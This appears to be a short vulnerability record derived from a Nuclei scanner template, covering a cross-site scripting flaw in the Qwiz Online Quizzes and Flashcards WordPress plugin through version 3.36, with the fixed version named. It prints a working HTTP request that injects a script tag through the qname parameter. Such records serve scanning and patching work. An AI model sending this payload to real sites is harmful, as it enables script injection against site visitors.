# Vulnerability: Qwiz Online Quizzes And Flashcards <= 3.36 - Cross-Site Scripting
**Classification:** WORDPRESS
**Source:** Nuclei Template (`wp-qwiz-online-xss.yaml`)

## Description
The qname, i_qwiz, session_id and username parameters passed to the registration_complete.php file are affected by XSS issues.

## Secure Mitigation
Fixed in version 3.37

## Vulnerable Code Pattern / Exploit Payload
```http
GET /wp-content/plugins/qwiz-online-quizzes-and-flashcards/registration_complete.php?&qname=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: {{Hostname}}
```

